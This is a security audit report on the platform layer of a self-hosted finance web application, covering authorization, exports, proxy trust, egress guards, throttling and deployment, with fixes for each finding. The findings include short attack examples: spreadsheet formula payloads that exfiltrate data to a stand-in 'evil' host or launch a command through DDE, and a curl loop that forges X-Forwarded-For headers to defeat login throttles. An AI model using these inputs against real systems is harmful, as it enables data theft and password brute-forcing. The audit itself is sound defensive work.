# Group 9 — Cross-cutting / platform layer audit (origin/main 43af3ca7)

Scope: `main.ts`, `app.module.ts`, `config/*`, `common/**` (guards, interceptors, filters, utils), auth plumbing (strategies, cookies, CSRF, throttling, `@Public()` inventory), repo-wide greps (raw SQL, exec, fs, XML/zip/xlsx, templates, DTO nesting, logging), multer/upload configs, deployment (compose, Dockerfiles, updater, workflows), frontend boundary (api client, CSP, proxy, `app/api`), dependency audit.

## Findings

| # | Severity | Confidence | Module / area | file:line | Title |
|---|----------|------------|---------------|-----------|-------|
| 1 | MEDIUM | LIKELY | authz (common) | `backend/src/common/authz/request-permissions.ts:48-56` | Account-level `users.permissions` grants override the workspace role in every workspace the user belongs to (a viewer elsewhere becomes an editor) |
| 2 | MEDIUM | CONFIRMED | exports (payables, income-tax, tax, gmail) | `backend/src/modules/payables/payables-export.service.ts:22-48`; `modules/income-tax/income-tax-document.ts:219-233`; `modules/tax/tax-return-document.ts:70-80`; `modules/gmail/services/gmail-receipt-export.service.ts:80-88` | Spreadsheet/CSV formula injection: user- and bank-sourced strings written to XLSX/CSV without `neutralizeSpreadsheetFormulaCell` |
| 3 | MEDIUM | LIKELY | main.ts + compose | `backend/src/main.ts:42`; `docker-compose.yml` backend `ports: "${BACKEND_PORT:-3001}:3001"` | `trust proxy 1` with the API port published on all interfaces: a direct client forges `X-Forwarded-For` and defeats the per-IP throttles on login / 2FA / reset and the session IP record |
| 4 | LOW | LIKELY | notifications gateway | `backend/src/modules/notifications/notifications.gateway.ts:23-31,161-175` | Socket.IO `cors` only guards the polling handshake; a websocket-only cross-site handshake is not origin-checked. Safe under the default `SameSite=lax`, exploitable (read-only notification hijack) when `AUTH_COOKIE_SAMESITE=none` |
| 5 | LOW | CONFIRMED | egress (SMTP, S3 test, IMAP plain) | `modules/open-protocol-integrations/open-protocol-integrations.service.ts:1102-1123`; `modules/mailer/mailer.service.ts:63`; `modules/reports/report-schedules.service.ts:307`; `modules/workspaces/workspaces.service.ts:1286`; `open-protocol-integrations.service.ts:287,505,1157` (`secure:false`) | Host is validated at save time, but the actual connection does not use the pinned lookup → DNS-rebinding window for SMTP, the S3 "test connection" client, and non-TLS IMAP |
| 6 | LOW | CONFIRMED | public upload mounts | `modules/investments/metals.controller.ts:140-160`; `modules/data-entry/data-entry.controller.ts:150-170` | Files under the public static mounts `/uploads/metal-photos` and `/uploads/custom-field-icons` are accepted on client-declared MIME only (no magic-byte check as avatars/logos have) — arbitrary bytes hosted publicly under an image extension |
| 7 | LOW | CONFIRMED | egress guard | `backend/src/common/utils/egress-url.util.ts:31-42,179-218` | IPv6 blocklist misses NAT64 `64:ff9b::/96`, 6to4 `2002::/16`, site-local `fec0::/10`; `fetchPublicUrl` replays caller headers (e.g. `Authorization`) to a different host after a redirect |
| 8 | LOW | CONFIRMED | auth | `backend/src/modules/auth/auth.controller.ts:131-174` | `2fa/setup`, `2fa/disable`, `2fa/recovery-codes` (password re-confirmation routes) have no `@Throttle`; only the global 500/min applies |
| 9 | LOW | CONFIRMED | error filter + integrations | `backend/src/common/filters/http-exception.filter.ts:86-101`; `open-protocol-integrations.service.ts:1115-1121,1128-1132,1167-1171` | `details` echoes the full `HttpException` body; integration "test connection" errors embed raw driver messages (`ECONNREFUSED 10.0.0.5:9000`, resolved addresses) → internal-network metadata leaks to workspace members |
| 10 | LOW | CONFIRMED | frontend CSP | `frontend/next.config.js:62` | `script-src 'self' 'unsafe-inline'` neutralises the CSP against reflected/stored XSS on the app origin |
| 11 | LOW | CONFIRMED | registration | `backend/src/modules/auth/auth.service.ts:190-216` | No instance-level registration switch: any internet client can create an account (and a workspace) on a self-hosted instance; only the 5/min throttle applies |
| 12 | LOW | CONFIRMED | DTO nesting | `backend/src/modules/gmail/dto/update-receipt.dto.ts` | `@IsObject()` property without `@ValidateNested`/`@Type` — nested object passes the whitelist unchecked (only hit repo-wide) |
| 13 | INFO | CONFIRMED | request context | `backend/src/common/observability/request-context.middleware.ts:17-24` | Client-supplied `x-request-id` is echoed unbounded into logs and response headers (JSON-encoded, so no log injection; size only) |

No CRITICAL or HIGH findings in the platform layer.

### 1. Account-level permissions leak across workspaces (MEDIUM, LIKELY)

Path: `PUT /users/:id/permissions` (`@WorkspaceAuth(Permission.USER_MANAGE)`, `users.controller.ts:265`) → `PermissionsService.updateUserPermissions` → `users.permissions` column (global, not per workspace) → `assertPermissions` → `roleAllows()`:

```ts
const granted = userPermissions(subject.user);            // users.permissions ?? ROLE_PERMISSIONS[role]
if (required.every(permission => granted.includes(permission))) {
  return true;                                           // workspace role never consulted
}
return required.every(permission => workspaceRoleAllows(permission, subject.workspaceRole, ...));
```

Scenario: instance admin (or anyone holding `USER_MANAGE`) opens workspace A and grants user X `STATEMENT_EDIT`/`STATEMENT_DELETE` "in workspace A". X is also a **viewer** in workspace B. Every `@WorkspaceAuth(STATEMENT_EDIT)` route in B now passes for X (`granted.includes()` short-circuits before `workspaceRoleAllows`), so a read-only invitee edits/deletes B's statements. Only the surfaces that also call `workspaceMemberCanEdit` at service level stay closed. Verified: the grant is stored on the user row and `assertPermissions` checks it before the workspace role; the exploit needs an admin to grant permissions, which the UI presents as workspace-scoped. Hypothesis: that the UI/admin workflow actually uses this endpoint for non-admin users.

Fix: in `roleAllows`, consult account-level `permissions` only when `subject.workspaceRole` is absent (user-scoped routes), or restrict `userPermissions()` to `GLOBAL_ONLY_PERMISSIONS`; otherwise move grants to `workspace_members.permissions`.
Tests: `@tests/unit/common/authz/*` cover role tables; no e2e for a cross-workspace grant.

### 2. Spreadsheet formula injection in four exports (MEDIUM, CONFIRMED)

`common/utils/spreadsheet-formula.util.ts` + `csv.util.ts` exist and are used by reports, storage CSV and custom tables, but not by:

- `payables-export.service.ts:22-48` — `payable.vendor`, `payable.comment` → `json_to_sheet` → `sheet_to_csv` / `writeFile` (CSV and XLSX).
- `income-tax-document.ts:219-233` — `row.counterparty`, `row.categoryName` → `json_to_sheet`.
- `tax-return-document.ts:70-80` — `line.counterparty` → `json_to_sheet`; the CSV variant (`buildTaxReturnCsv`, same file) too.
- `gmail-receipt-export.service.ts:80-88` — `formatReceiptRow(receipt)` (merchant from OCR/e-mail) → `aoa_to_sheet`.

Scenario: a counterparty name on an imported bank line / a vendor typed by a member is `=HYPERLINK("http://evil/?"&A1,"x")` or `=cmd|' /C calc'!A0`; an accountant opens the export in Excel/LibreOffice → DDE/HYPERLINK runs client-side. `sheet_to_csv` (xlsx 0.20.3) does not quote leading `=`.
Fix: wrap every string cell in these four builders with `neutralizeSpreadsheetFormulaCell` (one `map` per row object). Tests: `@tests/unit/common/utils/spreadsheet-formula.util.spec.ts` covers the helper only.

### 3. `trust proxy 1` + API port on all interfaces → throttle/IP spoofing (MEDIUM, LIKELY)

`main.ts:42` `app.set('trust proxy', 1)`; `docker-compose.yml` publishes `"${BACKEND_PORT:-3001}:3001"` (no `127.0.0.1:` prefix, unlike Postgres/Redis). When a client reaches :3001 directly (no reverse proxy, or proxy + port still open), Express takes `req.ip` from the client-supplied `X-Forwarded-For`. `ThrottlerGuard` (default tracker = `req.ip`) then buckets per forged IP: `POST /auth/login` 5/min, `/auth/forgot-password` 3/min, 2FA code check inside login, public share-link routes 30/min all become unlimited (`for i in ...; curl -H "X-Forwarded-For: 10.0.$i.1"`). `extractSessionContext` records the forged IP in `auth_sessions`/audit. Hypothesis: that the deployment leaves :3001 reachable; the shipped compose does by default.
Fix: publish backend as `127.0.0.1:${BACKEND_PORT}` (or document that the proxy is the only ingress), or make `trust proxy` conditional on `TRUST_PROXY=true`.

### 4. Cross-site WebSocket with `SameSite=none` (LOW, LIKELY)

`NotificationsGateway` authenticates from the `access_token` cookie. The `cors.origin` allowlist is enforced by engine.io on the HTTP polling handshake; a browser opening `wss://api/socket.io/?EIO=4&transport=websocket` from `evil.example` skips that middleware (engine.io `handleUpgrade` → `verify` checks only transport/sid/`allowRequest`). With default `lax`, the cookie is not sent on a cross-site WebSocket handshake, so this is inert; with `AUTH_COOKIE_SAMESITE=none` (the documented split-domain setting) the attacker's page receives the victim's `notification:new` events. Not verified against engine.io source (no `node_modules` in the audit tree).
Fix: add `allowRequest` that checks `Origin` against `resolveAllowedOrigins()`, or force `transports: ['polling','websocket']` ordering with `allowUpgrades` after an origin-checked polling handshake.

### 5. Egress check at save time, connection without pinned lookup (LOW, CONFIRMED)

`assertPublicEgressHost` runs when SMTP (`application-settings.service.ts:144`), S3 (`:180`), WebDAV (`:218`), IMAP (`:261`) settings are saved. The S3 **test** client (`assertS3Connection`, `:1102`) is built without `requestHandler: NodeHttpHandler({httpAgent, httpsAgent})`; the three `nodemailer.createTransport` calls never get a `lookup`; `ImapFlow` receives the pinned lookup only in `tls:` options, which are unused when `secure: false`. A host that resolves publicly at save time and privately afterwards (short TTL) reaches the internal SMTP/S3/IMAP service. Impact is limited to protocol-shaped traffic (SMTP/HTTP/IMAP) and credentials the attacker already set.
Fix: pass the same agents/lookup to the test S3 client; `nodemailer` `createTransport({ ..., lookup })` is not supported — re-run `assertPublicEgressHost` immediately before each `send`; prefer `socket`/`lookup` in ImapFlow connection options.

### 6. Public mounts accept unverified image bytes (LOW, CONFIRMED)

`static-assets.util.ts` mounts `/uploads/custom-field-icons`, `/uploads/goal-covers`, `/uploads/workspace-backgrounds`, `/uploads/metal-photos` with `express.static`. Goal covers/backgrounds are server-fetched Openverse bytes (content-type checked). Metal photos (`metals.controller.ts:140-160`) and custom-field icons (`data-entry.controller.ts:150-170`) are user uploads: the `fileFilter` trusts `file.mimetype` and the extension follows it; unlike avatars/logos no `validateImageSignature` runs. Served as `image/png` + helmet `X-Content-Type-Options: nosniff` + API CSP `default-src 'self'`, so no browser-executed XSS was found — the risk is hosting arbitrary (polyglot/malware/illegal) content on an unauthenticated URL.
Fix: call `validateImageSignature(file)` after upload (as `users.controller.ts:440`) and delete on failure.

### 7. Egress-guard gaps (LOW, CONFIRMED)

`isBlockedEgressAddress` blocks `::`, `::1`, `fc/fd`, `fe8-feb`, `ff`, `2001:db8` prefixes. Not blocked: `64:ff9b::7f00:1` (NAT64 → 127.0.0.1 where a NAT64 gateway exists), `2002:7f00:1::` (6to4), `fec0::/10`. Verified fine: decimal/octal/hex IPv4 (WHATWG URL normalises before the check), `0.0.0.0/8`, `169.254/16`, `100.64/10`, IPv4-mapped IPv6 (`::ffff:` starts with `::`), `localhost`, bracketed hosts, DNS rebinding (undici dispatcher + node agents with pinned lookup), manual redirect following with re-validation (max 3). `fetchPublicUrl` forwards `init.headers` unchanged across hosts on 30x — a bank-sync/webhook token could be replayed to a redirect target (the SimpleFIN `Authorization: Basic` passes through `BANK_SYNC_FETCH = fetchPublicUrl`).
Fix: add the three prefixes; strip `authorization`/`cookie` when the redirect host differs.

### 8. Password-confirmation routes without `@Throttle` (LOW, CONFIRMED)

`/auth/2fa/setup`, `/auth/2fa/disable`, `/auth/2fa/recovery-codes` verify the account password (bcrypt) and are limited only by the global 500/min. A stolen session (cookie) lets an attacker test ~500 passwords/min to disable 2FA or read recovery codes.
Fix: `@Throttle({ default: { limit: 5, ttl: 60000 } })` as on `2fa/enable`.

### 9. Raw driver messages in 4xx bodies (LOW, CONFIRMED)

`HttpExceptionFilter` returns `details: message` for every `HttpException`. Integration test-connection errors are built as `new BadRequestException(\`Failed to connect S3-compatible storage: ${this.getErrorMessage(error)}\`)` (`:1118`, `:1130`, `:1169`); SDK/driver messages name the resolved address/port. A member probing `endpoint: http://10.0.0.5:9000` gets `ECONNREFUSED 10.0.0.5:9000` vs a timeout — but `assertPublicEgressUrl` already blocks private targets, so this is a metadata leak for public hosts only.
Fix: map to a fixed message, log the detail.

### 10–13 (LOW/INFO)

- CSP `'unsafe-inline'` in `script-src` (`next.config.js:62`): standard Next.js trade-off; nonce-based CSP would restore XSS defence.
- Registration has no instance switch: fine for a personal install; add `REGISTRATION_DISABLED` for shared instances.
- `update-receipt.dto.ts` `@IsObject()` without `@ValidateNested` (gmail module to confirm the field's use).
- `x-request-id` echoed unbounded (truncate to 128 chars).

## Verified clean (platform layer)

- **main.ts**: helmet CSP `default-src 'self'`, `frame-ancestors 'none'`, `crossOriginResourcePolicy: cross-origin` (needed for split origins; CORP only affects embedding, auth still via cookie/CORS); JSON/urlencoded 1 MB; Swagger only when `NODE_ENV !== 'production'`; CORS allowlist from `CORS_ORIGINS`/`FRONTEND_URL`, production fails to start without one; dev localhost origins dropped in production (`cors-origins.ts`).
- **env.schema.ts / dev-defaults.ts / required-secret.util.ts / encryption.util.ts**: production requires `DATABASE_URL`, `JWT_SECRET`, `JWT_REFRESH_SECRET`, `INTEGRATIONS_ENCRYPTION_KEY`; dev secrets throw in production; AES-256-GCM, fail-closed decrypt. The only caveat is that everything hinges on `NODE_ENV=production`, which `docker-compose.yml` and both Dockerfiles set.
- **database.config.ts**: `synchronize: false`, logging opt-in, migrations on start. No TLS option for Postgres (compose runs it on the private network; a remote DB would be plaintext unless `?sslmode=` is in `DATABASE_URL` — note only).
- **CsrfGuard**: double-submit, `timingSafeEqual`, only when a cookie is present; `Authorization`/`X-Api-Key` bypass is safe because a browser cannot add either cross-site without a preflight the CORS allowlist rejects; empty `x-api-key` is falsy (no bypass); multipart is covered (method-based, not content-type); no `method-override` middleware in the repo; `@SkipCsrf` only on register/login/forgot/reset/email-confirm (no session yet); `/auth/refresh` keeps CSRF. WebSocket is out of its scope (see finding 4).
- **JwtAuthGuard / strategies**: cookie-first extraction; `jsonwebtoken 9.0.2` with a string secret restricts to HS* (no `alg:none`/RS confusion); `tokenVersion` + `auth_sessions.revokedAt` checked on every access token; refresh rotates (`refreshTokenHash` HMAC with `SESSION_TOKEN_SALT|JWT_REFRESH_SECRET`), old token rejected after rotation, reuse is not treated as theft (documented choice); API key = sha256 lookup (not timing-relevant), key forces `x-workspace-id`, mismatch → 403; `InstanceAdminGuard` refuses API keys; `WorkspaceContextGuard` checks membership, version workspaces read-only unless `@AllowInVersion`.
- **auth-cookies.ts**: `httpOnly`, `secure` in prod or when `sameSite=none`, `lax` default, CSRF cookie readable by design, `clearCookie` with matching options; cookie `maxAge` tracks token TTL.
- **Throttler**: Redis storage when `REDIS_URL` set (per-instance otherwise); global 500/min; `@Throttle` on register 5, login 5, forgot 3, reset 5, 2fa/enable 10, email-confirm 10, invitation preview 30 / accept 10, every public share/invoice/custom-table link 30, crypto refresh, system-update. Missing: see finding 8.
- **StripKeysInterceptor** (`SERVER_ONLY_KEYS`): drops `filePath, fileHash, fileData, storedFileName, attachmentPaths, passwordHash, tokenVersion, twoFactorSecret, twoFactorRecoveryCodes, encryptedSecrets` at any depth; passes through `Date`, streams, Buffers, `StreamableFile`, objects with `toJSON` — note: an entity exposing a secret under a different key (e.g. `apiKey.keyHash`, `webhookEndpoint.token`, `webhookSubscription.secret`, `shareToken`, `refreshTokenHash`, `botToken`) is NOT covered and relies on module contracts (module agents to confirm). `HideInternalColumnsInterceptor` additionally reduces `User` rows to id/email/name/avatar.
- **HttpExceptionFilter**: non-`HttpException` errors → `Internal server error` (stack only in logs); Postgres 22xxx/23503 mapped to generic 400/409; no SQL text or paths in the body. Validation errors return the class-validator array under `details` (field names only).
- **Logging**: `LoggingInterceptor` logs method/url/route/status/time/request ids only; no body/header logging anywhere (`grep logger.*(body|headers|password|token)` → none); `AppLogger` JSON lines. Stray `console.*` in 4 modules log error objects (may include driver messages) — not request bodies.
- **Raw SQL**: 70 `query()`/`createQueryRunner` sites — all parameterised (`$1…`); the only template literals splice server-side constants or `$n` placeholders (`formula-recalc.service.ts:134`, `backup-data.service.ts:256` uses TypeORM metadata names). Query-builder interpolations (`${column}`, `${alias}`, `${groupFormat}`, `${periodExpr}`, `${keyExpr}`) are all internal constants / `:param` names; the one client-driven sort (`custom-tables.service.ts:3646 orderBy(sortExpr, direction)`) builds `sortExpr` from parameters (`:d_col_n`) — module 'custom-tables' to confirm `direction` is whitelisted. No `orderBy(req…)`.
- **Dangerous APIs**: no `eval`; `new Function('return import(...)')` ×3 with literal module names (ESM interop); `spawn('pdftoppm', [...fixed args, '-'])` reads stdin, `spawn(python, [script, filePath])` with DB-stored path, `execFile` wrapper for thumbnails — no shell, no user input in argv.
- **fs**: public `avatars/:fileName` and `logo/:fileName` use `path.basename` + extension-allowlisted `Content-Type` + `nosniff`; `app.controller` `sendFile` of a fixed path; export downloads stream DB-derived paths (module agents cover ownership checks). `file-storage.service.resolveFilePath` accepts the DB `filePath` as-is (several candidate roots) — not client-controlled on any route I found (`filePath` appears only in response contracts).
- **Parsers**: `fast-xml-parser 5.7.2` with `processEntities: false` (no entity expansion/XXE; it never resolves external DTDs anyway); `adm-zip 0.6.1` used for DOCX (behind `assertSafeZipDecompressionRatio`), backups (in-memory `getData`, no extraction to disk), model archives (zip-slip check via `path.normalize` + prefix test, entry count and byte caps). `xlsx 0.20.3` from the vendor CDN (the npm `0.18.x` line has unpatched ReDoS/prototype-pollution advisories; 0.20.3 is the fixed line).
- **Templates**: e-mails are React Email components (`render()` escapes); no handlebars/ejs/pug; no `dangerouslySetInnerHTML` in backend. No `lodash.merge`/`deepmerge` on user settings.
- **DTOs**: global `ValidationPipe({whitelist, forbidNonWhitelisted, transform})`; no `@Body() x = {}` default trap; `@ValidateNested` present wherever `@IsObject` is used except finding 12. Effect `SchemaBody` used for auth bodies.
- **Multer**: single `multerConfig` (random UUID name + extension from an allowlisted MIME → `.bin` fallback, 10 MB) for statements/receipts/parsing/crypto/webhook inbound; avatars/logos 2 MB with `fileFilter` + magic bytes; data-entry icons 1.5 MB; metals photos; backups `BACKUP_UPLOAD_OPTIONS`; model archive 500 MB (instance admin, zip-slip/size capped); attachments `MAX_ATTACHMENT_BYTES` memory storage. `file-validator.util` sniffs magic bytes for PDF/XLSX/XLS/images; CSV/text are not sniffable by design.
- **select:false columns** (`passwordHash`, `twoFactorSecret`, recovery codes, `wrappedDataKey`, ledger flags): explicitly selected only in auth/login, account deletion, versions (key handling) and backups — all server-internal; `StripKeysInterceptor` would drop them from any response anyway.
- **Deployment**: Postgres/Redis published on `127.0.0.1` only; Redis unauthenticated but loopback/private network; backend/frontend images run as non-root `app`; no secrets baked into images (`NEXT_PUBLIC_*` build args are public by nature); `.env.example` ships `POSTGRES_PASSWORD=finflow` as an example only (compose refuses to start without the variables); updater profile is opt-in and validates `v\d+\.\d+\.\d+` on both sides before touching `sed`/`compose`; dev compose embeds the published dev JWT secrets but sets `NODE_ENV=development`. Workflows: `permissions: contents: read` default, no `pull_request_target`, no untrusted-head checkouts, `cd.yml` polls the CI run via `actions: read` and only elevates `packages: write` in build/release jobs; no secrets echoed.
- **Frontend boundary**: `api.ts` sends `X-CSRF-Token` from the readable cookie and `X-Workspace-Id` from the active workspace (never overriding an explicit header), `withCredentials: true`; `/api/*` and `/uploads/*` rewrites go to a fixed `API_PROXY_TARGET` (no client-chosen URL); `proxy.ts` only redirects unauthenticated navigations (cookie presence, not validation — fine, the API re-checks); `app/api/backgrounds/route.ts` lists a fixed directory, no input. Security headers: HSTS preload, nosniff, `X-Frame-Options: DENY`, `frame-ancestors 'none'`, geolocation self-only.
- **Dependencies**: `npm audit --omit=dev` on the lockfile → **0 vulnerabilities** (747 prod packages). Versions: express 5.2.1, @nestjs/core 11.1.26, helmet 8.3.0, multer 2.4.0, jsonwebtoken 9.0.2, passport-jwt 4.0.1, undici 6.28.1, typeorm 0.3.31, socket.io 4.8.3, nodemailer 10.0.13, imapflow 1.7.1, adm-zip 0.6.1, fast-xml-parser 5.7.2, xlsx 0.20.3 (vendor tarball).

## Inventory

### `@Public()` routes (27) and what protects them

| Route | Protection |
|-------|------------|
| `GET /health`, `GET /health/ready`, `GET /` | none (health JSON / API info; readiness returns dependency status names only) |
| `GET /metrics` | `METRICS_AUTH_TOKEN` bearer (`secretsMatch`); refuses in production when unset; open in dev |
| `POST /auth/register` | `@SkipCsrf`, 5/min/IP, optional invitation token (`findOne({token})`, 32-byte hex) |
| `POST /auth/login` | `@SkipCsrf`, 5/min/IP, bcrypt, 2FA code checked in the same call (`assertLoginCode`) |
| `POST /auth/forgot-password` | `@SkipCsrf`, 3/min/IP, constant 200 |
| `POST /auth/reset-password` | `@SkipCsrf`, 5/min/IP, HMAC-hashed single-use token with TTL, bumps `tokenVersion`, revokes sessions |
| `POST /auth/refresh` | `JwtRefreshGuard` (refresh cookie/bearer), CSRF still enforced, rotation + session hash match |
| `POST /users/me/email/confirm` | `@SkipCsrf`, 10/min, HMAC-hashed single-use token with TTL |
| `GET /users/avatars/:fileName` | `path.basename`, image-extension Content-Type allowlist, `nosniff`, unguessable name |
| `GET /business-profile/logo/:fileName` | same as avatars; 404 for non-image extension |
| `GET /workspaces/invitations/:token` | 30/min; `findOne({token})` → status, invitee e-mail, workspace name (token = secret) |
| `GET /storage/shared/:token`, `/download` | 30/min; `findOne({token})` on `shared_links` (32-byte hex) — module 'storage' for expiry/password |
| `GET /public-invoices/:token`, `/pdf` | 30/min; `shareToken` lookup |
| `GET /custom-tables/shares/:token`, `/rows` | 30/min; `findOne({token})` (32-byte hex) |
| `POST /webhooks/:token/statements`, `/receipts` (inbound) | `WebhookTokenGuard`: `findOne({token,isActive})` + plugin enabled; multer 10 MB; no `@Throttle` (global 500/min) |
| `POST /telegram/webhook` | `TelegramWebhookGuard`: `X-Telegram-Bot-Api-Secret-Token` vs `TELEGRAM_WEBHOOK_SECRET` (`secretsMatch`), refuses when unset |
| `POST /telegram/webhook/:botId` | `TelegramBotWebhookGuard`: per-bot derived secret (`webhookSecretOf(botToken)`), `secretsMatch` |
| `POST /gmail/webhook/pubsub` | `GmailWebhookGuard`: bearer vs `PUBSUB_WEBHOOK_TOKEN`, refuses when unset |
| `GET /google-drive/callback`, `/gmail/callback`, `/dropbox/callback` | OAuth state (module agents: state signing/binding to user) |

Also note: `MCP` controller is not public — `McpAccessGuard` requires an API key (`request.apiKey && apiKeyWorkspaceId`) + plugin enabled, then `WorkspaceContextGuard`.

### Outbound HTTP / network call sites

| Site | Destination | Guarded |
|------|-------------|---------|
| `webhooks/services/webhook-processor.service.ts:60-95,155` | subscriber URL (user) | **yes** — `assertPublicEgressUrl` + node http(s) agents with pinned lookup, no redirects, 4 KB body cap |
| `webhooks/services/webhook-subscriptions.service.ts:31,65` | validation on create/update | yes |
| `open-protocol-integrations.service.ts` S3 (`:180,:409,:774`), WebDAV (`:218,:1143`), IMAP (`:261,:285,:504,:1156`) | user hosts | yes (URL/host check + agents/lookup); **partial**: test S3 client `:1102` and non-TLS IMAP (finding 5) |
| `application-settings.service.ts:144` SMTP save; `mailer.service.ts:63`, `report-schedules.service.ts:307`, `workspaces.service.ts:1286` | user SMTP host | host checked at save; sends unpinned (finding 5) |
| `investments/stock-price.service.ts:95` | Stooq, fixed host | yes (`assertPublicEgressUrl`) |
| `bank-sync` providers (`bank-sync.module.ts:20`) | provider URLs (SimpleFIN access URL is user-supplied) | yes — `BANK_SYNC_FETCH = fetchPublicUrl` |
| `workspaces/workspace-backgrounds.service.ts:270`, `goals/goal-covers.service.ts` via `openverse.util` | Openverse API + image URLs from its JSON | yes (`fetchPublicUrl`, content-type allowlist) |
| `telegram.service.ts:394,855,1137,1181`, `telegram-bots.service.ts:259` | `api.telegram.org` (bot token in path) | no guard needed (fixed host; token cannot change host) |
| `vendor-icons.service.ts:91` | `icons.duckduckgo.com/ip3/<domain>.ico` | no guard needed (fixed host; `isValidVendorDomain` before use; path segment only) |
| `geocoding.service.ts:208` | `GEOCODER_URL` (operator config, may be private) | intentionally unguarded |
| `maps.service.ts` | `TILESERVER_URL` (operator config), style ids validated against server list | intentionally unguarded |
| `crypto/*` (CoinGecko, Blockscout, mempool, TronGrid, `SOLANA_RPC_URL` env) | fixed hosts / env | n/a |
| `google-drive.service.ts:265,291,313,447`, `gmail*.service.ts`, `dropbox.service.ts:292-331` | Google/Dropbox APIs, fixed hosts | n/a |
| `peppol/recommand.client.ts:257` | `app.recommand.eu` fixed | n/a |
| `reference-data/*` (TEDB, VIES, public holidays) | fixed government hosts via `REFERENCE_FETCH` | n/a |
| `system-update.service.ts` (GitHub releases via Effect HttpClient) | fixed | n/a |

No `axios`/`got` usage; the only `node:http(s)` request is the webhook processor.

### exec / spawn sites

| Site | Command | Input |
|------|---------|-------|
| `parsing/services/ocr.service.ts:264` | `spawn('pdftoppm', ['-png','-r',DPI,'-f','1','-l','1','-singlefile','-',prefix])` | PDF bytes via stdin; `prefix` = mkdtemp path |
| `common/utils/pdf-parser.util.ts:170,174,198` | `spawnSync(python, ['--version'])`, `['-c','import pdfplumber']`, `spawn(python, [script, filePath])` | `filePath` from statement record (server-generated name) |
| `common/utils/thumbnail-command.util.ts:6` | `execFile(command, args)` | callers pass fixed binaries + server paths |
| `open-protocol-integrations.service.ts:1139`, `backups/backup-destination.service.ts:129`, `advanced-language-detector.util.ts:508` | `new Function('return import(...)')` | literal module names only |

No `exec`/`execSync` with a shell; no user string reaches argv.

### Raw SQL sites (verdict: all parameterised)

`workspaces.service.ts:861`, `app.service.ts:23`, `versions/version-snapshot.service.ts:59,79`, `version-scheduler.service.ts:73`, `versions.service.ts:177`, `webhook-processor.service.ts:98`, `users.service.ts:296,316,335`, `tax/tax-payments-category.ts:14,23`, `statements/services/receipt-statement.service.ts:122,193`, `statements.service.ts:481,798`, `tax/ustva/ustva.service.ts:110`, `tax/tax-assignment.service.ts:233,415,438`, `payees/payee-resolution.ts:27-50`, `payees.service.ts:372-437`, `payables.service.ts:589,721,987`, `payables/unbooked-payments.service.ts:39-107`, `ledger/ledger-sync.service.ts` (12 sites), `ledger-reports.service.ts` (8), `ledger-entries.service.ts:135`, `ledger-revaluation.service.ts:95-278`, `ledger-posting.service.ts:241-981`, `invoices.service.ts:472-612`, `public-invoices.service.ts:180`, `invoice-ageing.service.ts:60`, `credit-notes.service.ts:433-437`, `income-tax-completeness.service.ts:310`, `import-session.service.ts:613` (query runner, ORM calls), `custom-tables/formula-recalc.service.ts:134` (VALUES list of `$n::uuid,$n::jsonb` placeholders), `backups/backup-data.service.ts:255` (table/column names from TypeORM metadata, value `ANY($1::uuid[])`). Advisory locks use `hashtextextended($1,0)` with the key as a parameter. Query-builder string fragments: `review-inbox.service.ts:104-107` (`column` = internal constant), `statements.service.ts:957-1150` (server constants, `conditions` joined with `:param` names), `dashboard.service.ts:578-590,1017,1191` (`groupFormat` literal `'YYYY-MM'`, `column` internal), `reports.service.ts:2707` (`periodExpr` chosen from 4 literals), `notes.service.ts:290` (`column` from `this.targets[entityType]` map), `custom-tables.service.ts:3352,3888` (`:f_val_n`/`:d_col_n` parameters), `classification/engine/payee-evidence.ts`, `transaction-owner.util.ts`, `counted-transactions.util.ts` (alias constants). Tenant scoping of these queries is the module agents' call.

## Not checked / uncertainty

- engine.io's websocket-upgrade origin handling (finding 4) is from memory of the 6.x source; `node_modules` is absent in the audit tree.
- `custom-tables.service.ts:3646` sort `direction` whitelist and `shareToken`/`token` expiry/password semantics belong to module agents.
- Whether any response contract still exposes `keyHash`, `webhook token/secret`, `shareToken`, `botToken`, `refreshTokenHash` — these keys are not in `SERVER_ONLY_KEYS`; module agents should confirm their DTO/contract projections.
- OAuth `state` validation in the three `@Public()` callbacks (google-drive/gmail/dropbox) — module scope.
- Postgres TLS: no `ssl` option in `database.config.ts`; relevant only for a remote database.
